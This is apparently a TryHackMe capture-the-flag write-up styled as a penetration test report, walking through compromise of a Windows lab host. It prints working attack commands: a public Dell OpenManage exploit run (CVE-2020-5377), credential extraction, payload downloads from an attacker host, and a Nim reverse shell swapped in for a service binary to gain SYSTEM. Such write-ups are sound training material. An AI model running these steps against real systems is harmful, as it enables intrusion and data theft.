# Hack Smarter Security
## Difficulty Medium
Can you hack the hackers?

Challenge Description
Your mission is to infiltrate the web server of the notorious Hack Smarter APT (Advanced Persistent Threat) group. This group is known for conducting malicious cyber activities, and it's imperative that we gather intel on their upcoming targets.

The Hack Smarter APT operates a well-protected web server, fortified with advanced security measures. Your objective is to compromise their server undetected, extract the list of upcoming targets, and leave no trace of your presence.

To begin, you'll need to employ your extensive hacking skills and exploit any vulnerabilities in their server's defenses. Remember, stealth and discretion are key. You must avoid triggering any alarms that could lead to a premature shutdown of the server or alert the Hack Smarter APT group to your presence.

Once you gain access to their server, navigate through their intricate network infrastructure, bypassing firewalls, encryption protocols, and other security layers. Locate the central repository where they store sensitive information, including their upcoming target list. Intel has reported this is located on the desktop of the Administrator user.

Exercise caution as you retrieve the list. The Hack Smarter APT group is known for employing countermeasures such as intrusion detection systems and advanced monitoring tools. It's crucial that you maintain a low profile and avoid leaving any traces that could compromise the mission or endanger your own safety.

Upon successfully acquiring the list of upcoming targets, transmit the data to our secure server using encrypted channels. This will ensure that our analysts can analyze the information and take appropriate action to protect potential targets from cyber attacks.

Remember, this is a high-stakes mission, and the information you gather will be instrumental in dismantling the Hack Smarter APT group's operations. Good luck, and may your skills lead you to success in this mission.

## Executive Summary

This report details a simulated offensive security assessment conducted on the "Hack Smarter Security" challenge from TryHackMe (THM). The objective was to infiltrate a web server operated by a fictional Advanced Persistent Threat (APT) group, extract sensitive intelligence (a list of upcoming targets), and demonstrate the vulnerabilities present in the system. The assessment was performed in a controlled CTF environment, adhering to ethical hacking principles.

### Key Findings
- **Initial Access**: Gained via anonymous FTP access and exploitation of a Dell OpenManage vulnerability (CVE-2020-5377).
- **Privilege Escalation**: Achieved through service binary replacement exploiting weak file permissions.
- **Data Exfiltration**: Successfully retrieved the target list from the Administrator's desktop.
- **Overall Risk**: The system exhibited multiple high-severity vulnerabilities, including misconfigured services and unpatched software, allowing full compromise from initial reconnaissance to root-level access.

### Recommendations
- Patch all known vulnerabilities, particularly those affecting embedded management interfaces.
- Implement least privilege principles for service accounts and binaries.
- Regularly audit file permissions and service configurations.
- Employ intrusion detection systems and monitoring to detect anomalous activities.

This report provides a step-by-step walkthrough to facilitate learning and replication in similar environments.

## Methodology

The assessment followed a structured penetration testing methodology inspired by the MITRE ATT&CK framework and OWASP Testing Guide:

1. **Reconnaissance**: Passive and active scanning to identify open ports, services, and potential entry points.
2. **Enumeration**: Detailed probing of discovered services to gather intelligence.
3. **Exploitation**: Leveraging identified vulnerabilities to gain initial access.
4. **Privilege Escalation**: Elevating privileges from user to administrator level.
5. **Post-Exploitation**: Navigating the system to locate and exfiltrate target data.
6. **Reporting**: Documenting findings, steps, and recommendations.

Tools utilized include Nmap for scanning, FTP clients for enumeration, Python scripts for exploitation, SSH for remote access, PowerShell for privilege checking, and custom reverse shells for escalation. All actions were performed with a focus on stealth to avoid detection.

## Reconnaissance

### Network Scanning
Initial reconnaissance began with a comprehensive Nmap scan to identify open ports and running services on the target IP (10.201.79.117).

**Command:**
```bash
nmap -sC -sV 10.201.79.117 -oN nmap_report
```

**Key Findings:**
- **Port 21 (FTP)**: Open, allowing anonymous login (Microsoft ftpd).
- **Port 22 (SSH)**: Open, running OpenSSH 7.7 for Windows.
- **Port 80 (HTTP)**: Open, serving Microsoft IIS 10.0 with a custom title "HackSmarterSec".
- **Port 1311 (SSL/RXMON)**: Open, identified as Dell OpenManage interface with SSL certificate details.
- **Port 3389 (RDP)**: Open, Microsoft Terminal Services.
- OS Detected: Windows Server (likely 2019 based on version info).

The scan revealed potential vulnerabilities, including anonymous FTP access and an embedded management interface on port 1311.

### FTP Enumeration
Exploiting the anonymous FTP access allowed retrieval of sensitive files.

**Login Process:**
```bash
ftp 10.201.79.117
Name (10.201.79.117:santstyle): anonymous
Password: [empty]
```

**Directory Listing:**
```
06-28-23  02:58PM                 3722 Credit-Cards-We-Pwned.txt
06-28-23  03:00PM              1022126 stolen-passport.png
```

**File Retrieval:**
```bash
ftp> mget *
```

**Analysis of Retrieved Data:**
- `Credit-Cards-We-Pwned.txt`: Contained a list of compromised credit card details (e.g., VISA numbers, expiration dates, CVVs). This indicated the APT group's involvement in financial fraud.
- `stolen-passport.png`: A high-resolution image of a stolen passport, further evidencing criminal activities.

These files provided initial intelligence but did not directly lead to system access.

## Exploitation

### Vulnerability Identification
The Nmap scan highlighted port 1311 running what appeared to be Dell OpenManage. Research identified this as vulnerable to CVE-2020-5377 (and related CVE-2021-21514), a remote code execution flaw in Dell EMC OpenManage Server Administrator.

### Exploit Execution
Utilized a public exploit script (CVE-2020-5377.py) to gain arbitrary file read access on the target.

**Command:**
```bash
python3 CVE-2020-5377.py 10.9.1.172 10.201.79.117:1311
```

**Session Establishment:**
```
Session: 9C679C031EECBC0DFCF80E766F2555F2
VID: 8AA728FC16B40799
```

**File Reading Attempts:**
Attempted to read web.config files to extract credentials.

**Successful Extraction:**
```
file > \inetpub\wwwroot\hacksmartersec\web.config
Reading contents of \inetpub\wwwroot\hacksmartersec\web.config:
<configuration>
  <appSettings>
    <add key="Username" value="tyler" />
    <add key="Password" value="IAmA1337h4x0randIkn0wit!" />
  </appSettings>
  <location path="web.config">
    <system.webServer>
      <security>
        <authorization>
          <deny users="*" />
        </authorization>
      </security>
    </system.webServer>
  </location>
</configuration>
```

**Credentials Obtained:**
- Username: tyler
- Password: IAmA1337h4x0randIkn0wit!

### Initial Access via SSH
Using the extracted credentials, established SSH access to the target.

**Command:**
```bash
ssh tyler@10.201.79.117
Password: IAmA1337h4x0randIkn0wit!
```

**Successful Login:**
```
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.
tyler@HACKSMARTERSEC C:\Users\tyler>
```

**User-Level Flag Retrieval:**
Navigated to the desktop and retrieved the user flag.

```bash
tyler@HACKSMARTERSEC C:\Users\tyler\Desktop>type user.txt
THM{*****************}
```

## Privilege Escalation

### Privilege Assessment
To identify escalation vectors, deployed PrivescCheck, a PowerShell script for automated privilege escalation checks.

**Setup:**
- Cloned the PrivescCheck repository on the local machine.
- Served the script via HTTP for transfer to the target.

**Local Commands:**
```bash
git clone https://github.com/itm4n/PrivescCheck.git
cd PrivescCheck
sudo python3 -m http.server 80
```

**Target Transfer and Execution:**
```bash
tyler@HACKSMARTERSEC C:\Users\tyler\Documents>curl http://10.9.1.172/PrivescCheck.ps1 -o priv.ps1
tyler@HACKSMARTERSEC C:\Users\tyler\Documents>powershell -ep bypass
PS C:\Users\tyler\Documents> . .\priv.ps1; Invoke-PrivescCheck
```

**Critical Finding:**
PrivescCheck identified a vulnerable service: "spoofer-scheduler" running as LocalSystem with modifiable binary permissions.

```
┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
┃ NAME     ┃ Services - Image File Permissions                 ┃
┃ TYPE     ┃ Base                                              ┃
┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ Check whether the current user has any write permissions on  ┃
┃ a service's binary or its folder.                            ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

Name              : spoofer-scheduler
DisplayName       : Spoofer Scheduler
User              : LocalSystem
ImagePath         : C:\Program Files (x86)\Spoofer\spoofer-scheduler.exe
StartMode         : Automatic
Type              : Win32OwnProcess
RegistryKey       : HKLM\SYSTEM\CurrentControlSet\Services
RegistryPath      : HKLM\SYSTEM\CurrentControlSet\Services\spoofer-scheduler
Status            : Running
UserCanStart      : True
UserCanStop       : True
ModifiablePath    : C:\Program Files (x86)\Spoofer\spoofer-scheduler.exe
IdentityReference : BUILTIN\Users (S-1-5-32-545)
Permissions       : AllAccess
```

### Exploit Development
Exploited the weak permissions by replacing the service binary with a reverse shell.

**Reverse Shell Creation:**
- Cloned Nim-Reverse-Shell repository.
- Modified the source to connect back to the attacker's IP on port 80.
- Compiled for Windows using Nim.

**Local Commands:**
```bash
git clone https://github.com/Sn1r/Nim-Reverse-Shell.git
sudo apt install nim
nim c -d:mingw --app:gui -o:spoofer-scheduler.exe rev_shell.nim
```

**Binary Replacement:**
- Backed up the original binary.
- Served the malicious binary via HTTP.
- Downloaded and replaced the target binary.

**Target Commands:**
```bash
PS C:\Program Files (x86)\Spoofer> mv spoofer-scheduler.exe spoofer-scheduler-backup.exe
PS C:\Program Files (x86)\Spoofer> curl http://10.9.1.172:80/spoofer-scheduler.exe -o spoofer-scheduler.exe
```

**Reverse Shell Activation:**
- Stopped and restarted the service to execute the payload.
- Established a listener on the attacker's machine.

**Attacker Commands:**
```bash
nc -lvnp 80
PS C:\Program Files (x86)\Spoofer> sc.exe stop spoofer-scheduler
PS C:\Program Files (x86)\Spoofer> sc.exe start spoofer-scheduler
```

**Successful Escalation:**
```
nc -lvnp 80
listening on [any] 80 ...
connect to [10.9.1.172] from (UNKNOWN) [10.201.79.117] 50536
C:\Windows\system32>
```

The shell ran with SYSTEM privileges, granting full administrative access.

## Post-Exploitation

### Data Exfiltration
With SYSTEM-level access, navigated to the Administrator's desktop to locate the target intelligence.

**Commands:**
```bash
C:\Windows\system32> cd C:\Users\Administrator\Desktop\
C:\Users\Administrator\Desktop> type Hacking-Targets\hacking-targets.txt
Next Victims:
CyberLens, WorkSmarter, SteelMountain
```

**Target List Retrieved:**
- CyberLens
- WorkSmarter
- SteelMountain

This completed the primary objective of extracting the APT group's upcoming targets.

### Cleanup (Simulated)
In a real scenario, traces would be removed, including:
- Restoring the original service binary.
- Clearing logs and temporary files.
- Terminating reverse shells.

However, as this was a CTF, no cleanup was performed to maintain the challenge integrity.

## Conclusion

The "Hack Smarter Security" challenge was successfully compromised, demonstrating the dangers of unpatched vulnerabilities and misconfigured permissions in enterprise environments. From initial reconnaissance to full SYSTEM access, the assessment highlighted critical weaknesses that could allow real-world attackers to exfiltrate sensitive data.

### Lessons Learned
- Embedded management interfaces (e.g., Dell OpenManage) must be patched and isolated.
- Service binaries should not have write permissions for low-privilege users.
- Regular vulnerability scanning and privilege audits are essential.
- Defense-in-depth strategies, including network segmentation and monitoring, can mitigate such risks.

This report serves as a comprehensive guide for security professionals to understand and replicate the attack chain, fostering better defensive practices. For further details or questions, refer to the raw logs or contact the assessor.

**Report Author:** [SantStyle]  
**Date:** [31 Oct 2025]  
**Tools Used:** Nmap, FTP, Python, SSH, PowerShell, Nim, Netcat  
**Disclaimer:** This assessment was conducted in a controlled environment. Unauthorized use of these techniques is illegal.
